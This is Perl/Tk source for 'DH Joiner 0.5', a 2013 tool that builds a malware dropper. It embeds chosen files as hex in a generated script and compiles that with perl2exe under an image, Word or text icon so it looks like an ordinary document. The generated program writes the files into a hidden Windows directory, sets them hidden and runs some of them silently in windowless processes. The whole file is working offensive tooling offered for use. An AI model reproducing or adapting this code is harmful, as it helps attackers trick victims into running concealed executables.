#!usr/bin/perl
#Project DH Joiner 0.5
#(C) Doddy Hackman 2013

use Tk;
use Tk::PNG;
use Tk::FileSelect;
use Win32;
use Cwd;
use File::Basename;

my $color_fondo = "black";
my $color_texto = "green";

if ( $^O eq 'MSWin32' ) {
    use Win32::Console;
    Win32::Console::Free();
}

my $gen = MainWindow->new( -background => $color_fondo );

$gen->title("Project DH Joiner 0.5 (C) Doddy Hackman 2013");
$gen->geometry("400x640+20+20");
$gen->resizable( 0, 0 );

my $in = $gen->Photo( -file => "logo.png", -format => "png" );
$gen->Label( -image => $in, -borderwidth => 0 )->pack();

$gen->Label(
    -text       => "-- == Files == --",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 140, -y => 100 );

$gen->Label(
    -text       => "Filename",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 55, -y => 140 );
my $lista_nombres = $gen->Listbox(
    -height     => 10,
    -width      => 15,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -y => 170, -x => 40 );

$gen->Label(
    -text       => "File",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 180, -y => 140 );
my $lista_rutas = $gen->Listbox(
    -height     => 10,
    -width      => 20,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -y => 170, -x => 150 );

$gen->Label(
    -text       => "Type",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 300, -y => 140 );
my $lista_tipo = $gen->Listbox(
    -height     => 10,
    -width      => 10,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -y => 170, -x => 290 );

$gen->Label(
    -text       => "-- == Add Files == --",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 130, -y => 330 );

$gen->Label(
    -text       => "File : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 370 );
my $add_file = $gen->Entry(
    -width      => 30,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 55, -y => 375 );
$gen->Button(
    -text             => "Browse",
    -command          => \&mostrarfile,
    -width            => 8,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -activebackground => $color_texto
)->place( -x => 245, -y => 375 );
$gen->Button(
    -text             => "Add",
    -command          => \&add_now,
    -width            => 8,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -activebackground => $color_texto
)->place( -x => 305, -y => 375 );
$gen->Label(
    -text       => "Type : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 400 );

my $t = $gen->Radiobutton(
    -text             => "Hidden",
    -value            => "Hidden",
    -variable         => \$op_ti,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -activebackground => $color_texto
)->place( -x => 65, -y => 405 );
$t->select;

$gen->Radiobutton(
    -text             => "Show",
    -value            => "Show",
    -variable         => \$op_ti,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -activebackground => $color_texto
)->place( -x => 125, -y => 405 );

$gen->Label(
    -text       => "-- == Options == --",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 130, -y => 435 );

$gen->Label(
    -text       => "Directory to hide : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 470 );
my $dir_hide = $gen->Entry(
    -text       => "C:/WINDOWS/sexnow",
    -width      => 30,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 140, -y => 475 );

$gen->Checkbutton(
    -text             => "Hide Files",
    -font             => "Impact",
    -variable         => \$hide_op,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -activebackground => $color_texto
)->place( -x => 20, -y => 500 );
$gen->Label(
    -text       => "Icon : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 530 );

my $h = $gen->Radiobutton(
    -text             => "Image",
    -value            => "Image",
    -variable         => \$op_i,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -activebackground => $color_texto
)->place( -x => 65, -y => 535 );
$h->select;
$gen->Radiobutton(
    -text             => "Word",
    -value            => "Word",
    -variable         => \$op_i,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -activebackground => $color_texto
)->place( -x => 125, -y => 535 );
$gen->Radiobutton(
    -text             => "TXT",
    -value            => "TXT",
    -variable         => \$op_i,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -activebackground => $color_texto
)->place( -x => 180, -y => 535 );

$gen->Button(
    -command          => \&generatenow,
    -text             => "Generate!",
    -font             => "Impact",
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -width            => 30,
    -activebackground => $color_texto
)->place( -x => 75, -y => 580 );

MainLoop;

sub generatenow {

    my @nombres;
    my @rutas;
    my @tipos;

    my $total = $lista_nombres->size - 1;

    for my $number ( 0 .. $total ) {
        my $linkar = $lista_nombres->get($number);
        push( @nombres, $linkar );
    }

    my $total = $lista_rutas->size - 1;

    for my $number ( 0 .. $total ) {
        my $linkar = $lista_rutas->get($number);
        push( @rutas, $linkar );
    }

    my $total = $lista_tipo->size - 1;

    for my $number ( 0 .. $total ) {
        my $linkar = $lista_tipo->get($number);
        push( @tipos, $linkar );
    }

## Source

    unlink("joiner.pl");
    unlink("joiner.exe");

    my $total = int(@nombres);

    my $linea_mods;
    my $vars;
    my $linea_hides;
    my $linea_archivos;
    my $th_inicios;
    my $th_joins;
    my $th_cmd;
    my $cmds;

    $linea_mods .= "use Win32;\n";
    $linea_mods .= "use Win32::Job;\n";
    $linea_mods .= "use Win32::File;\n";
    $linea_mods .= "use threads;\n\n";
    $linea_mods .= "
if ($^O eq 'MSWin32') {
use Win32::Console;
Win32::Console::Free();
}\n\n";

    my $vars = '
my $dir_hide = "' . $dir_hide->get . '";
my $hide_op = "' . $hide_op . '";';

    my $makedir_code = '
unless (-d $dir_hide) {
mkdir($dir_hide,777);
chdir($dir_hide);
}
else {
chdir($dir_hide);
}' . "\n";

    for my $num ( 0 .. $total - 1 ) {

        my $nombress = $nombres[$num];
        my $ruta     = $rutas[$num];

        my $code_crear = "";

        my $hex = unpack "H*", getcontent($ruta);

        $linea_archivos .= "open(GENNOW,'>>'.'$nombress');\n";
        $linea_archivos .= "binmode(GENNOW);\n";
        $linea_archivos .= 'my $hex_now ' . "= pack 'H*','$hex';\n";
        $linea_archivos .= 'print GENNOW $hex_now;' . "\n";
        $linea_archivos .= "close GENNOW;\n";

    }

    if ( $hide_op eq 1 ) {

        my $dir_hide = $dir_hide->get;

        for my $num ( 0 .. $total - 1 ) {
            my $nombress = $nombres[$num];
            $linea_hides .= "hideit('$nombress','hide');\n";
        }
        $linea_hides .= "hideit('$dir_hide','hide');\n";
    }

    for my $num ( 0 .. $total - 1 ) {
        $th_inicios .=
          'my $comando' . $num . ' = threads->new(\&fun_' . $num . ');' . "\n";
    }

    for my $num ( 0 .. $total - 1 ) {
        $th_joins .= '$comando' . $num . '->join();' . "\n";
    }

    for my $num ( 0 .. $total - 1 ) {

        my $nombress = $nombres[$num];
        my $ruta     = $rutas[$num];
        my $tipos    = $tipos[$num];

        $th_cmd .= "sub fun_" . $num . " {\n";
        if ( $tipos eq "Show" ) {
            $th_cmd .= "cargar_normal(\"$nombress\");\n";
        }
        else {
            $th_cmd .= "cargar_hide(\"$nombress\");\n";
        }
        $th_cmd .= "}\n";
    }

    my $cmds = '
sub cargar_normal {
system($_[0]);
} 

sub cargar_hide {  
my $job = Win32::Job->new;
$job->spawn("cmd",qq{cmd /C $_[0]},{no_window =>"true"});             
$ok = $job->run("30");
}

sub hideit {
if ($_[1] eq "show") {
Win32::File::SetAttributes($_[0],NORMAL);
}
elsif ($_[1] eq "hide") {
Win32::File::SetAttributes($_[0],HIDDEN);
}
}';

    open( JOINER, ">>joiner.pl" );

    print JOINER "#!usr/bin/perl\n";
    print JOINER "#DH Joiner 0.5 (C) Doddy Hackman 2013\n\n";
    print JOINER $linea_mods;
    print JOINER $vars . "\n";
    print JOINER $makedir_code . "\n";
    print JOINER $linea_archivos . "\n";
    print JOINER $linea_hides . "\n";
    print JOINER $th_inicios . "\n";
    print JOINER $th_joins . "\n";
    print JOINER $th_cmd . "\n";
    print JOINER $cmds . "\n";
    print JOINER "\n#The End ?";

    close JOINER;

    sub getcontent {

        open( FILE, $_[0] );
        binmode(FILE);
        my @lines = <FILE>;
        close FILE;

        $code = join "", @lines;
        return $code;

    }

##

## PERL2EXE

    chdir( getcwd() );

    unlink( getcwd() . "/PERL2EXE/joiner.pl" );
    unlink( getcwd() . "/PERL2EXE/joiner.exe" );

    Win32::CopyFile( "joiner.pl", getcwd() . "/PERL2EXE/joiner.pl", 0 );

    chdir( getcwd() . "/PERL2EXE" );

    if ( $op_i eq "Image" ) {
        system("perl2exe -icon=image.ico joiner.pl");
    }
    elsif ( $op_i eq "Word" ) {
        system("perl2exe -icon=doc.ico joiner.pl");
    }
    elsif ( $op_i eq "TXT" ) {
        system("perl2exe -icon=txt.ico joiner.pl");
    }
    else {
        system("perl2exe -icon=image.ico joiner.pl");
    }

##

## Copy

    Win32::CopyFile( "joiner.exe", "../" . "joiner.exe", 0 );

##

## End

    $gen->Dialog(
        -title            => "Information",
        -buttons          => ["OK"],
        -text             => "Joiner Ready",
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->Show();

##

}

sub add_now {

    $lista_nombres->insert( "end", basename( $add_file->get ) );
    $lista_rutas->insert( "end", $add_file->get );
    unless ( $op_ti eq "" ) {
        $lista_tipo->insert( "end", $op_ti );
    }
    else {
        $lista_tipo->insert( "end", "Show" );
    }
}

sub mostrarfile {

    $browse = $gen->FileSelect( -directory => getcwd() );
    my $filea = $browse->Show;

    $add_file->configure( -text => $filea );

}

#The End ?
